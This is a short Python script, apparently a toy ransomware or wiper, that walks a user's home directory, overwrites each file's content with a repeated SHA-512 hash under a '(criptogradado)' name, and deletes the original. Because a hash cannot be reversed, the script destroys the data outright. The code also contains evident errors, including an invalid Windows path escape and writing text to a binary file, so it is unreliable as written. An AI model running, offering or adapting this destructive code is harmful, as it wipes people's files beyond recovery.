import hashlib
import  os

diretorio= "C:\Users\USER"

for files in os.listdir(diretorio):
    os.chdir(diretorio)
    with open(files, 'rb') as rb:
        dados = rb.read()
        criptografar = hashlib.sha512(dados).hexdigest()
        novo_arquivo= '(criptogradado) '+ os.path.basename(files)
        with open(novo_arquivo, 'wb') as novo:
            novo.write(criptografar*0xFF)
            novo.close()
            rb.close()

            os.remove(files)
